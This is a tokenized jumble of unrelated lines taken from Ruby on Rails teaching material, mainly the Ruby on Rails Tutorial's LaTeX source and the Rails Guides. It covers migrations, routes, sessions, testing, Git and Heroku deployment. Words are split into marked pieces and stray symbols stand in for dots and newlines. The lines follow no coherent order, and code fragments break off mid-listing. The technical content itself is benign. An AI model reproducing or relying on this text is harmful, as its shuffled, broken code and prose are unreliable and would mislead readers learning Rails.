▁create _ table ▁: orders ▁do ▁| t |
▁create ▁app / views / users / show ▖ json ▖ jbuilder
▁To ▁do ╼ this , ▁we ▁need ▁to ▁implement ▁a ▁link ▁of ▁some ▁sort ▁in ▁the ▁view ▁and ▁a ▁` destroy `╼ action ▁in ▁the ▁` Comments Controller ` .
▁| ▁File / D ir ec to ry ▁| ▁P urpose ▁|
▁We ' ll ▁start ▁with ▁a ▁couple ▁tests ▁in v ol v ing ▁collection s ▁of ▁valid ▁and ▁invalid ▁addresses .
▁| ▁PATCH / PUT ▁| ▁ / kategorien / : id ▁| ▁categories # update ▁| ▁ category _ path (: id ) ▁|
▁We ' ll ▁con t in ue ▁this ▁the me ▁by ▁using ▁a ▁\ k ode { destroy } ▁action ▁to ▁delete ▁sessions , ▁i ▖ e ▖ , ▁to ▁log ▁out .
▁$ ▁rake
▁P a g in ating ▁the ▁users ▁in ▁the ▁\ k ode { index } ▁action .
▁That ▁means ▁that ▁you ▁can ▁require ▁it ▁like ▁this :
▁As ▁a ▁result , ▁it ' s ▁convenient ▁to ▁use ▁a ▁common ▁topic ▁branch :
▁to ▁visit ▁the ▁root ▁path ▁before ▁each ▁example .
▁This ▁can ▁be ╼ add ed ▁above ▁the ▁` title ` ▁field ▁with ▁this ▁code :
▁### ▁` has _ and _ belongs _ to _ many ` ▁Association ▁Reference
▁These ╼ classes ▁must ▁implement ▁a ▁` validate ` ▁method ▁which ▁take s ▁a ▁record ▁as ▁an ▁argument ╼ and ▁perform s ▁the ▁validation ▁on ▁it ▖
▁# ▁ polymorphic _ url ( record ) ▁# ▁same ▁as ▁comment _ url ( record )
▁app / assets / javascripts / home ▖ js
▁* ▁Call ▁` redirect _ to ` ▁to ▁send ▁an ▁HTTP ▁redirect ▁status ▁code ▁to ▁the ▁browser
▁At ▁this ▁point , ▁we ' re ▁ready ▁to ▁merge ▁our ▁changes ▁into ▁the ▁master ▁branch :
▁The ▁mockup s ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁are ▁made ▁with ▁an ▁excellent ▁online ▁mockup ▁application ▁called ▁\ href { http :// g o mock ing b ir d ▖ com } { Mo c k ing b ir d } .
▁$ ▁ cat ▁~/ ▖ s sh / id _ rs a ▖ p ub
▁The ▁default ▁Rails ▁cache ▁store ▁will ▁be ▁used ▁by ▁Sprockets ▁to ▁cache ▁assets ▁in ╼ development ▁and ▁production ▖
▁person ▖ errors [: name ]
▁If ▁you ▁don ' t ▁have ▁Ruby ▁installed ▁have ▁a ▁look ▁at ╼[ ruby - lang ▖ org ]( https :// www ▖ ruby - lang ▖ org / en / install ation / ) ▁for ▁possible ▁ways ▁to ╼ install ▁Ruby ▁on ▁your ▁platform .
▁Defin ing ▁a ▁ Factory ▁Girl ▁ sequence .
▁If ▁you ▁create ▁an ▁association ▁some ▁time ▁after ▁you ▁build ▁the ▁under ly ing ▁model , ▁you ▁need ▁to ▁remember ▁to ▁create ▁an ▁` add _ column ` ▁migration ▁to ▁provide ▁the ▁necessary ▁foreign ▁key .
▁The ▁other ▁place ▁with ▁links ▁is ▁the ▁ footer ▁partial , ▁\ k ode { \_ footer ▖ html ▖ erb }, ▁which ▁has ▁links ▁for ▁the ▁About ▁and ▁Contact ▁pages ▁( Listing ~\ ref { code : footer _ partial _ links }) .
▁#### ▁escape _ javascript
▁Implement ing ▁\ k ode { user ▖ followers } ▁using ▁ passive ▁relationships .
▁To ▁enable ▁this , ▁pass ▁a ▁new ▁object ▁to ▁the ▁config ▁option ▁in ▁` application ▖ rb `:
▁< h 1> Edit ▁article </ h 1>
▁# ▁ Activ ate s ▁an ▁account .
▁( Because ▁the ▁default ▁ navbar ▁ color ▁changed ▁between ▁B oo st rap ▁2▖0 ▁and ▁ 2▖1 , ▁we ▁need ▁the ▁\ k ode { navbar - inverse } ▁class ▁to ▁make ▁it ▁d ar k ▁instead ▁of ▁light ▖)
▁A lthough ▁virtual ly ▁all ▁Rails ▁developers ▁a g re e ▁that ▁testing ▁is ▁a ▁good ▁idea , ▁there ▁is ▁a ▁d ivers ity ▁of ▁ o p in ion ▁on ▁the ▁details .
▁invoke ▁ rspec
▁An ▁alter n ate ▁implementation ▁of ▁the ▁\ k ode { before \_ save } ▁callback ▖
▁module ▁B an g B an g
▁Ou r ▁strategy ▁for ▁handling ▁account ▁activation ▁parallel s ▁user ▁login ▁( Section ~\ ref { sec : logging _ in }) ▁and ▁es pecially ▁remember ing ▁users ▁( Section ~\ ref { sec : remember _ me }) .
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated } .
▁ delegate ▁: s tree t , ▁to : ▁: address , ▁prefix : ▁true
▁It ▁is ▁short er , ▁and ▁the ▁intention ▁more ▁obvious .
▁Extensions ▁can ▁refer ▁to ▁the ▁ internal s ▁of ▁the ▁association ▁ proxy ▁using ▁these ▁three ▁attributes ▁of ▁the ▁` proxy _ association ` ▁ accessor :
▁In ▁particular , ▁we ▁can ▁write
▁In ▁the ▁present ▁case , ▁since ▁we ▁are ▁ still ▁in ▁the ▁Users ▁controller ▁but ▁want ▁to ▁ paginate ▁\ emph { microposts } ▁instead , ▁we ▁pass ▁an ▁explicit ▁\ k ode {@ microposts } ▁variable ▁to ▁\ k ode { will \_ paginate } .
▁$ ▁ rm d ir ▁ workspace /
▁This ▁is ╼ d one ▁by ▁the ▁` isolate _ namespace ` ▁call ▁inside ▁the ▁` Engine ` ▁class ▖
▁Here ▁we ▁use ▁\ k ode { is \_ logged \_ in ?}\ ▁instead ▁of ▁\ k ode { logged \_ in ?}\ ▁so ▁that ▁the ▁test ▁helper ▁and ▁Sessions ▁helper ▁methods ▁have ▁different ▁names , ▁which ▁prevent s ▁them ▁from ▁being ▁mistake n ▁for ▁each ▁other
▁By ▁default , ▁Rails ▁will ▁serve ▁the ▁results ▁of ▁a ▁rendering ▁operation ▁with ▁the ▁ MIME ▁content - type ▁of ▁` text / html ` ▁( or ▁` application / json ` ▁if ▁you ▁use ▁the ▁`: json ` ▁option , ▁or ▁` application / xml ` ▁for ▁the ▁`: xml ` ▁option ▖) ▖
▁in ▁Listing ~\ ref { code : add _ activation _ to _ users _ migration } .
▁belongs _ to ▁: author , ▁class _ name : ▁" User "
▁#### # ▁` ago `, ▁` since `
▁In ▁this ▁case , ▁saving ▁or ▁destroying ▁an ▁order ▁will ▁update ▁the ▁timestamp ▁on ▁the ▁ associated ▁customer ▖
▁To ▁make ▁the ▁scaffold ▁styling ▁apply , ▁insert ▁this ▁line ▁into ▁the ▁`< head >` ╼ tag ▁of ▁this ▁layout :
▁in ▁Listing ~\ ref { code : sample _ relationships } .
▁end _ of _ month ▁( at _ end _ of _ month )
▁article ▁GET ▁ / articles / : id (▖ : format ) ▁articles # show
▁in ▁Listing ~\ ref { code : remember _ test } .
▁Rails ▁views ▁can ▁contain ▁static ▁HTML ▁or ▁ embedded ▁Ruby ▁( ERb ) .
▁# ▁Now ▁you ▁have ▁to ▁do ▁this
▁Rails ▁will ▁use ▁that ▁particular ▁setting ▁to ▁configure ▁Active ▁Record .
▁To ▁try ▁to ▁avoid ▁co ll is ion s ▁people ▁choose ▁some ▁ label ▁that ▁character ize s ▁what ▁the ▁ chain ing ▁is ▁about :
▁config ▖ action _ mailer ▖ default _ options ▁= ▁ {
▁Because ▁the ▁\ k ode { account \_ activation } ▁method ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation } ▁requires ▁a ▁valid ▁user ▁object ▁as ▁an ▁argument , ▁the ▁code ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } ▁won ' t ▁work ▁as ▁written .
▁" foo \ n \ n bar "▖ indent ( 2, ▁nil , ▁true ) ▁# ▁=> ▁" ▁ foo \ n ▁\ n ▁bar "
▁ ╼ ▁> > ▁x ▁- = ▁7
▁We ▁ begin ▁our ▁development ▁of ▁the ▁Microposts ▁resource ▁with ▁some ▁access ▁control ▁in ▁the ▁Microposts ▁controller .
▁self ▖ include _ root _ in _ json ▁= ▁false
▁Ju st ▁as ▁with ▁ member ▁routes , ▁you ▁can ▁pass ▁`: on ` ▁to ▁a ▁route :
▁Active ▁Record ▁uses ▁the ▁` new _ record ?` ▁instance ╼ method ▁to ▁determine ▁whether ▁an ▁object ▁is ▁already ▁in ▁the ▁database ▁or ▁not .
▁In ▁Ruby ▁1▖9 ▁` prev _ year ` ▁and ▁` next _ year ` ▁return ▁a ▁date ▁with ▁the ▁same ▁day / month ▁in ▁the ▁last ▁or ▁next ▁ year :
▁page ▁to ▁make ▁a ▁new ▁user
▁i ▖ save !
▁\ href { http :// www ▖ michael hartl ▖ com /}{ Michael ▁Hartl } ▁is ▁the ▁author ▁of ▁the ▁\ href { http :// www ▖ railstutorial ▖ org /}{ \ emph { Ruby ▁on ▁Rails ▁Tutorial } }, ▁the ▁leading ▁introduction ▁to ▁web ▁development ▁with ▁\ href { http :// rubyonrails ▖ org /}{ Ruby ▁on ▁Rails } .
▁* ▁Use ▁Ruby ▁> = ▁1▖9 ▁syntax ▁for ▁hashes ▖
▁For ▁example , ▁if ╼ you ▁have ▁an ▁instance ▁variable ▁`@ article ` ▁containing ▁an ▁article , ▁you ▁can ▁retrieve ╼ all ▁the ▁comments ▁ belonging ▁to ▁that ▁article ▁as ▁an ▁array ▁using ╼ `@ article ▖ comments ` .
▁### ▁Change s ▁on ▁ Default ▁Scopes
▁To ▁eliminate ▁an ▁un w an ted ▁process , ▁use ▁the ▁\ text tt { kill } ▁command ▁to ▁issue ▁the ▁Unix ▁ kill ▁code ▁( which ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Unix _ sign al # List _ of _ sign al s } { h app en s ▁to ▁be ~ 9 }) ▁to ▁the ▁p id :
▁Rails ▁make s ▁them ▁easy ▁to ▁use , ▁provides ╼ built - in ▁helpers ▁for ▁common ▁needs , ▁and ▁allows ▁you ▁to ▁create ▁your ▁own ▁validation ╼ methods ▁as ▁well .
▁The ▁method ▁` to _ formatted _ s ` ▁ acts ▁like ▁` to _ s ` ▁by ▁default .
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁rows ▁| ▁ Extra ▁|
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / try ▖ rb ` .
▁@ see _ more ▁= ▁ video s ▖ many ?
▁* ▁A re ▁you ▁h app y ▁with ▁the ▁tests ?
▁yield (: content ) ▁: ▁yield ▁%></ div >
▁# ▁1▖ o d d ?
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁1
▁mail ▁= ▁Noti fi er ▖ notify ( user , ▁ ▖▖▖)
▁end
▁C ▖ new ( 0, ▁1) ▖ instance _ variable _ name s ▁# ▁=> ▁[" @ x ", ▁" @ y "]
▁format ▖ js ▁ { }
▁M ▖ parent ▁# ▁=> ▁X :: Y
▁</ tr >
▁Use ▁the ▁: filter _ html ▁option ▁to ▁remove ▁HTML ▁which ▁was ▁not ▁created ▁by ▁the ▁Text ile ▁process or .
▁We ' ll ▁first ▁m ir r or ▁the ▁format ▁validation ▁by ▁using ▁the ▁\ k ode { accept } ▁parameter ▁in ▁the ▁\ k ode { file \_ field } ▁input ▁tag :
▁In ▁` development ▖ rb `:
▁This ▁is ▁because ▁the ▁user ' s ▁remember ▁digest ▁was ▁delete d ▁as ▁part ▁of ▁logging ▁out ▁( Listing ~\ ref { code : user _ model _ forget }) ▁in ▁ Firefox , ▁so ▁when ▁we ▁access ▁the ▁application ▁in ▁C h r o me ▁we ▁end ▁up ▁calling
▁If ▁you ▁have ▁\ href { http :// brew ▖ sh /}{ Home brew } ▁on ▁OS ~ X , ▁you ▁can ▁install ▁\ k ode { curl } ▁using ▁\ k ode { brew ▁install ▁ curl } .
▁* ▁` collection << ( object , ▁ ▖▖▖)
▁The ▁above ▁migration ▁creates ▁a ▁method ▁named ▁` change ` ▁which ▁will ▁be ▁called ▁when ╼ you ▁run ▁this ▁migration ▖
▁That ▁code ▁includes ▁the ▁lines
▁create ▁a ▁new ▁session ▁( login )
▁If ▁the ▁code ▁in ▁Listing ~\ ref { code : micropost _ dependency } ▁is ▁working ▁correctly , ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁method
▁create ▁test / controllers / welcome _ controller _ test ▖ rb
▁The ▁` redirect _ to ` ▁method ▁does ▁something ▁completely ▁different : ▁it ▁tell s ▁the ▁browser ▁to ▁send ▁a ▁new ▁request ▁for ▁a ▁different ▁URL ▖
▁ Account ▁ activations ▁and ▁password ▁resets ▁use ▁a ▁generated ▁token ▁to ▁create ▁a ▁unique ▁URL ▁for ▁ activating ▁users ▁or ▁reset ting ▁passwords , ▁respectively .
▁If ▁set ▁to ▁true ▁( the ▁default ), ▁then ▁the ▁ Customer ▁class ▁will ▁use ▁the ▁` customers ` ▁table ▖
▁We ▁see ▁here ▁that ▁a ▁file ▁has ▁been ▁delete d , ▁but ▁the ▁changes ▁are ▁only ▁on ▁the ▁`` working ▁ tree '' ; ▁they ▁have n ' t ▁been ▁commit ted ▁yet .
▁For ▁more ▁on ▁Ruby ▁classes ▁and ▁the ▁\ k ode { self } ▁keyword , ▁see ▁the ▁\ href { http :// rails t ips ▖ org /}{ Rails T ips } ▁post ▁`` \ href { http :// rails t ips ▖ org / blog / archive s / 2006 / 11 / 18 / class - and - instance - variable s - in - ruby /}{ Class ▁and ▁In st ance ▁ V a ri able s ▁in ▁Ruby } '' .
▁" b ", ▁" r ", ▁" o ", ▁" f ", ▁" e ", ▁" w ", ▁" v ", ▁" m ", ▁" a ", ▁" x ", ▁" p "]
▁( The ▁green ▁ welcome ▁message ▁is ▁accomplish ed ▁using ▁the ▁\ emph { flash }, ▁which ▁we ' ll ▁learn ▁about ▁in ▁Section ~\ ref { sec : the _ flash } ▖)
▁ dependent : ▁: destroy
▁The ▁result ▁will ▁be ▁to ▁replace ▁the ▁default ▁Rails ▁page ▁from ▁Figure ~\ ref { fig : riding _ rails } ▁with ▁the ▁`` hello , ▁world '' ▁page ▁that ▁is ▁the ▁goal ▁of ▁this ▁section .
▁See ▁the ▁GitHub ▁post ▁\ href { https :// github ▖ com / blog / 92 6 - sh in y - new - commit - style s } { S h in y ▁new ▁commit ▁style s } ▁for ▁more ▁information .
▁S ub j ec t s ▁include ▁Ruby ▁on ▁Rails , ▁front - end ▁development , ▁web ▁design , ▁and ▁data ▁ science .
▁( N o w ▁you ▁know ▁why ▁HTML ▁views ▁have ▁the ▁file ▁extension ▁\ k ode { ▖ html ▖ erb } ▖)
▁ ╼ ▁$ ▁< edit or ▁name > ▁ .
▁Fin ally , ▁use ▁the ▁\ k ode { heroku ▁create } ▁command ▁to ▁create ▁a ▁place ▁on ▁the ▁Heroku ▁server s ▁for ▁the ▁sample ▁app ▁to ▁live ▁( Listing ~\ ref { code : heroku _ create }) .
▁* ▁` set _ load _ path ` ▁This ▁initializer ▁run s ▁before ▁` bootstrap _ hook ` ▖
▁The ▁( ra the r ▁ subtle ) ▁ ge ar ▁ icon ▁in ▁the ▁file ▁ navigator ▁pa ne .
▁The ▁initial ▁\ k ode { README } ▁file ▁for ▁our ▁project ▁at ▁GitHub ▖ ~\ href { http :// railstutorial ▖ org / images / figures / rails _ readme _4_0 - full ▖ png }{( full ▁size )}
▁You ▁can ▁person al ize ▁these ▁messages ▁using ▁the ▁`: wrong _ length `, ╼` : to o _ long `, ▁and ▁`: to o _ sh or t ` ▁options ▁and ▁` % { count } ` ▁as ▁a ▁place h ol d er ▁for ▁the ╼ number ▁corresponding ▁to ▁the ▁length ▁constraint ▁being ▁used ▖
▁Extensions ▁to ▁All ▁Object s
▁When ▁the ▁built - in ▁validation ▁helpers ▁are ▁not ▁enough ▁for ▁your ▁needs , ▁you ▁can ╼ write ▁your ▁own ▁validator s ▁or ▁validation ▁methods ▁as ▁you ▁prefer .
▁has _ many ▁: line _ items , ▁-> ▁ { ▁group ▁' orders ▖ id ' ▁ },
▁ Most ▁browsers ▁display ▁the ▁contents ▁of ▁the ▁title ▁tag ▁at ▁the ▁to p ▁of ▁the ▁browser ▁window , ▁and ▁it ▁is ▁also ▁important ▁for ▁search - engine ▁opt im i z ation .
▁Create s ▁a ▁field ▁set ▁for ▁group ing ▁HTML ▁form ▁elements .
▁#### # ▁` weeks _ ago `
▁U nobtrusive ▁JavaScript
▁match ▁' / application ▖ js ', ▁to : ▁Sprockets , ▁via : ▁: all
▁This ▁is ▁the ▁technical ▁meaning ▁of ▁`` e verything ▁in ▁Ruby ▁is ▁an ▁object '' .
▁{" title "=>" First ▁article !" , ▁" text "=>" This ▁is ▁my ▁first ▁article ▖ "}
▁me g abytes
▁The ▁signin ▁form ▁(\ href { http :// localhost :3000/ signin }{/ signin }) ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signin _ form _ bootstrap - full ▖ png }{( full ▁size )}
▁This ▁guide ▁focus es ▁on ▁the ▁inter action ▁between ▁Controller ▁and ▁View ▁in ▁the ▁Model - View - Controller ▁tri an g le ▖
▁< ul >< li >`: address ` ▁- ▁ Allow s ▁you ▁to ▁use ▁a ▁remote ▁mail ▁server ▖
▁sample ▁application .
▁It ' s ▁convenient ▁to ▁model ▁sessions ▁as ▁a ▁RESTful ▁resource : ▁we ' ll ▁have ▁a ▁signin ▁page ▁for ▁\ emph { new } ▁sessions , ▁ signing ▁in ▁will ▁\ emph { create } ▁a ▁session , ▁and ▁ signing ▁out ▁will ▁\ emph { destroy } ▁it .
▁( Y es , ▁this ▁can ▁be ▁confusing ▖)
▁t ▖ text ▁: description
▁# ▁=> ▁Sun ▁Mar ▁28 ▁01 : 59 : 59 ▁+ 0 1 00 ▁2010
▁create ▁app / views / blorgh / articles / new ▖ html ▖ erb
▁O p en ▁up ▁a ▁command ▁line ▁pro mp t ▖
▁The ▁method ▁` Array ▖ wrap ` ▁wrap s ▁its ▁argument ▁in ▁an ▁array ▁unless ▁it ▁is ▁already ▁an ▁array ▁( or ▁array - like ) .
▁### ▁In side ▁an ▁ Engine
▁class ▁A p point ment ▁< ▁ActiveRecord :: Base
▁javascript _ include _ tag ▁: all
▁First , ▁in ▁the ▁case ▁of ▁the ▁user / micropost ▁association ▁we ▁could ▁write
▁Rails ▁comes ▁with ▁a ▁ script ▁for ▁making ▁controllers ▁called ▁\ k ode { generate } ; ▁all ▁it ▁needs ▁to ▁work ▁its ▁magic ▁is ▁the ▁controller ' s ▁name .
▁A ▁mockup ▁of ▁the ▁sample ▁application ' s ▁Home ▁page .
▁gem ▁' coffee - rails '
▁ Step ▁definition s ▁can ▁re p li c ate ▁this ▁functionality ▁with ▁ regex ▁match ers , ▁but ▁I ▁generally ▁find ▁this ▁approach ▁to ▁be ▁more ▁( c u ) c um b er some .
▁start ▁of ▁ regex
▁We ▁will ▁identify ▁privilege d ▁ administrative ▁users ▁with ▁a ▁boolean ▁\ k ode { admin } ▁attribute ▁in ▁the ▁User ▁model , ▁which , ▁as ▁we ' ll ▁see , ▁will ▁automatically ▁lead ▁to ▁an ▁\ k ode { admin ?}\ ▁boolean ▁method ▁to ▁test ▁for ▁admin ▁status .
▁> , ▁' 200 9 - 0 08 ' ▁=> ▁< Invoice ▁ ▖ ▖ .
▁If ▁you ▁have ▁a ▁Rails ▁template ▁that ▁add s ▁all ▁the ▁files ▁in ▁version ▁control , ▁it ╼ fa i l s ▁to ▁add ▁the ▁generated ▁bin stub s ▁because ▁it ▁get s ▁executed ▁before ▁Bundler :
▁has _ one ▁: address
▁ Adding ▁lines ▁to ▁check ▁for ▁the ▁appearance ▁of ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises }) .
▁message ▖ to ▁= ▁[ ' sandbox @ example ▖ com ']
▁* ▁How ▁to ▁understand ▁the ▁ various ▁types ▁of ▁Active ▁Record ▁associations .
▁Active ▁Job ▁supports ▁G lo b al ID ▁for ▁parameters ▖
▁# ▁Create ▁the ▁token .
▁has _ many ▁: line _ items , ▁ inverse _ of : ▁: order
▁We ▁start ▁by ▁ generating ▁an ▁integration ▁test ▁for ▁our ▁application ' s ▁login ▁behavior :
▁Note ▁that , ▁unlike ▁the ▁default ▁generated ▁Relationship ▁model , ▁in ▁this ▁case ▁only ▁the ▁\ k ode { followed \_ id } ▁is ▁ accessible .
▁subject : ▁" A l read y ▁rendered !" )
▁def ▁new _ registration ( user )
▁ XML _ TYPE _ N A M E S ▁= ▁ {
▁# ▁ ▖ ▖ .
▁* ▁` config ▖ middleware ▖ insert _ after ( ex ist ing _ middleware , ▁new _ middleware , ▁ args ) ` ▁- ▁Add s ▁the ▁new ▁middleware ▁after ▁the ▁specified ▁existing ▁middleware ▁in ▁the ▁middleware ▁ stack .
▁we ▁have
▁technical ▁ sophistication
▁< nav >
▁Un do ing ▁the ▁generation ▁means ▁remov ing ▁not ▁only ▁the ▁principal ▁generated ▁file , ▁but ▁all ▁the ▁an ci ll ary ▁files ▁as ▁well .
▁In ▁Ruby , ▁they ▁are ▁optional , ▁so ▁these ▁two ▁are ▁equivalent :
▁This ▁section ▁is ▁optional ▁and ▁can ▁be ▁skip ped ▁without ▁ lo s s ▁of ▁con t in u ity .
▁With ▁the ▁code ▁in ▁this ▁section , ▁the ▁user ▁edit ▁page ▁should ▁be ▁working ▁( Figure ~\ ref { fig : edit _ form _ working }), ▁as ▁you ▁can ▁double - check ▁by ▁re - running ▁the ▁test ▁suite , ▁which ▁should ▁now ▁be ▁\ passing :
▁The ▁first ▁method , ▁\ k ode { initialize }, ▁is ▁special ▁in ▁Ruby : ▁it ' s ▁the ▁method ▁called ▁when ▁we ▁execute ▁\ k ode { User ▖ new } .
▁It ' s ▁helpful ▁in ▁this ▁context ▁to ▁define ▁a ▁\ k ode { is \_ logged \_ in ?}\ ▁helper ▁method ▁to ▁parallel ▁the ▁\ k ode { logged \_ in ?}\ ▁helper ▁defined ▁in ▁Listing ~\ ref { code : logged _ in _ p }, ▁which ▁returns ▁\ k ode { true } ▁if ▁there ' s ▁a ▁user ▁id ▁in ▁the ▁( test ) ▁session ▁and ▁false ▁otherwise ▁( Listing ~\ ref { code : test _ helper _ sessions }) .
▁We ' ll ▁be ▁implement ing ▁all ▁three ▁of ▁the ▁most ▁common ▁models ▁for ▁login / logout ▁behavior ▁on ▁the ▁web : ▁`` for getting '' ▁users ▁on ▁browser ▁close ▁( Section ~\ ref { sec : sessions _ and _ failed _ login } ▁and ▁Section ~\ ref { sec : logging _ in }), ▁\ emph { a utomatically } ▁remember ing ▁users ▁( Section ~\ ref { sec : remember _ me }), ▁and ▁\ emph { option ally } ▁remember ing ▁users ▁base d ▁on ▁the ▁value ▁of ▁a ▁`` remember ▁me '' ▁checkbox ▁( Section ~\ ref { sec : remember _ me _ checkbox })
▁< p >
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : stylesheets _ partial }
▁However , ▁if ▁combine d ▁with ╼ ▁other ▁technique s , ▁client - side ▁validation ▁can ▁be ▁a ▁convenient ▁way ▁to ▁provide ╼ ▁users ▁with ▁ im media te ▁feedback ▁as ▁they ▁use ▁your ▁site .
▁One ▁nice ▁effect ▁of ▁build ing ▁the ▁authentication ▁machinery ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁is ▁that ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁implement ▁ authorization ▁as ▁well .
▁ Integration ▁tests , ▁known ▁as ▁\ emph { request ▁ spec s } ▁in ▁the ▁context ▁of ▁RSpec , ▁allow ▁us ▁to ▁simul ate ▁the ▁actions ▁of ▁a ▁user ▁interact ing ▁with ▁our ▁application ▁using ▁a ▁web ▁browser .
▁xml ▖ description ( item _ description ( item ) ) ▁if ▁item _ description ( item )
▁Before ▁we ▁wrote ▁\ k ode { remember ▁user } ▁without ▁parentheses , ▁but ▁when ▁used ▁with ▁the ▁ ternary ▁operator ▁omit ting ▁them ▁results ▁in ▁a ▁syntax ▁error .
▁We ' ve ▁used ▁\ k ode { let } ▁in ▁a ▁couple ▁of ▁ exercises , ▁but ▁this ▁is ▁the ▁first ▁time ▁we ' ve ▁seen ▁it ▁in ▁the ▁ body ▁of ▁the ▁tutorial .
▁H app ily , ▁Rails ▁comes ▁with ▁a ▁command - line ▁program , ▁or ▁\ emph { script }, ▁that ▁run s ▁a ▁\ emph { local } ▁web ▁server , ▁ visible ▁only ▁from ▁your ▁development ▁machine
▁# ▁=> ▁Tue , ▁ 06 ▁Sep ▁2011 ▁ 12 : 34 : 32 ▁+0000
▁I ▁recommend ▁updating ▁your ▁\ k ode { ▖ gitignore } ▁file ▁as ▁show n ▁in ▁Listing ~\ ref { code : gitignore _ upload s } ▁so ▁that ▁the ▁image ▁upload s ▁directory ▁is ▁ignore d .
▁length : ▁30 , ▁omission : ▁" ▖▖▖" )
▁$ ▁ rm ▁- r f ▁t mp /
▁App ly ing ▁this ▁idea ▁to ▁the ▁relationships ▁fixtures ▁gives ▁the ▁associations ▁in ▁Listing ~\ ref { code : relationships _ fixtures } .
▁By ▁doing ▁this , ▁Rails ▁is ▁in form ed ▁that ▁the ╼ directory ▁for ▁this ▁gem ▁may ▁contain ▁assets ▁and ▁the ▁` app / assets `, ▁` lib / assets ` ▁and ╼` vendor / assets ` ▁directories ▁of ▁this ▁engine ▁are ▁added ▁to ▁the ▁search ▁path ▁of ╼ Sprockets .
▁%>╼ ╼ ▁<%= ▁f ▖ label ▁: password ▁%>╼ ▁<%= ▁f ▖ password _ field ▁: password , ▁class : ▁' form - control ' ▁%>╼ ╼ ▁<%= ▁f ▖ label ▁: password _ confirmation , ▁" C on fi rm ation " ▁%>╼ ▁<%= ▁f ▖ password _ field ▁: password _ confirmation , ▁class : ▁' form - control ' ▁%>╼ ╼ ▁<%= ▁f ▖ submit ▁" Create ▁my ▁account ", ▁class : ▁" btn ▁ btn - primary " ▁%>╼ ▁<% ▁end ▁%>╼ ▁</ div >╼ </ div >╼ \ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁a _ test _ for _ invalid _ submission ▁( end )╼╼ ▁% ▁section ▁ unsuccessful _ signup s ▁( end )╼╼ ▁\ section { S u cc ess ful ▁signup s } ▁% ▁( fold )╼ ▁\ label { sec : successful _ signup s }╼╼
▁S ince ▁the ▁ condition ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ first _ cut } ▁actually ▁just ▁check s ▁inclusion ▁in ▁a ▁set , ▁there ▁must ▁be ▁a ▁more ▁ efficient ▁way ▁to ▁do ▁this , ▁and ▁in de ed ▁SQL ▁is ▁optimized ▁for ▁just ▁such ▁set ▁operations .
▁ ╼\ end { aside }╼╼ ▁\ section { User ▁model } ▁% ▁( fold )╼ ▁\ label { sec : user _ model }╼╼
▁ Adding ▁` offset ` ▁to ▁that
▁For ▁a ▁more ▁advanced ▁way ▁to ▁create ▁the ▁necessary ▁ subselect , ▁see ▁the ▁blog ▁post ▁\ href { http :// p ivotal lab s ▖ com / users / js us s er / blog / articles / 5 67 - h ac k ing - a - subselect - in - active record } { ` ` H ac k ing ▁a ▁ subselect ▁in ▁ActiveRecord '' ▖ }
▁How ▁do ▁you ▁know ▁which ▁is ▁which ?
▁In ▁particular , ▁it ▁ensure s ▁that ▁a ▁\ text tt { POST } ▁request ▁to ▁ / users ▁is ▁handle d ▁by ▁the ▁\ k ode { create } ▁action .
▁As ▁with ▁the ▁\ k ode { header } ▁tag ' s ▁classes , ▁this ▁class ▁has ▁special ▁meaning ▁to ▁Bootstrap .
▁In ▁Section ~\ ref { sec : activation _ test _ and _ refactoring }, ▁we ' ll ▁complete ▁the ▁process ▁by ▁adding ▁some ▁tests ▁and ▁then ▁doing ▁a ▁little ▁refactoring .
▁The ▁remember ▁token ▁cookie ▁in ▁the ▁local ▁browser ▖ ~\ href { http :// railstutorial ▖ org / images / figures / cookie _ in _ browser - full ▖ png }{( full ▁size )}
▁=> ▁[ "1" , ▁" 2 ", ▁" 3 ", ▁" 4 "]
▁Like ▁` d ist ance _ of _ time _ in _ words `, ▁but ▁where ▁` to _ time ` ▁is ▁ fixed ▁to ▁` Time ▖ now ` .
▁get ▁' : user name ', ▁to : ▁' users # show ', ▁as : ▁: user
▁F a ile d ▁signup ▁with ▁error ▁messages ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signup _ error _ messages _ bootstrap - full ▖ png }{( full ▁size )}
▁( The ▁code ▁in ▁this ▁file ▁is ▁Ruby , ▁but ▁don ' t ▁worry ▁at ▁this ▁point ▁about ▁the ▁syntax ; ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁will ▁cover ▁Ruby ▁in ▁more ▁ de p th ▖)
▁A ▁user ▁has ▁many ▁microposts .
▁When ▁run ▁the ▁next ▁time , ▁it ▁will ▁only ▁copy ▁over ▁migrations ▁that ╼ have n ' t ▁been ▁copie d ▁over ▁already ▖
▁* ▁ Strict - Transport - Security
▁( Figure ~\ ref { fig : signup _ failure _ 3 r d _ edition } ▁also ▁shows ▁the ▁\ emph { web ▁console }, ▁which ▁open s ▁a ▁Rails ▁console ▁in ▁the ▁browser ▁to ▁as s ist ▁in ▁debugging .
▁class ▁ Magazine ▁< ▁ActiveRecord :: Base
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" 5▖0 "
▁You ▁don ' t ▁need ▁to ▁see ▁the ▁details ▁of ▁these ▁section s ▁when ▁you ' re ▁con c ent r ating ▁on ▁a ▁particular ▁page .
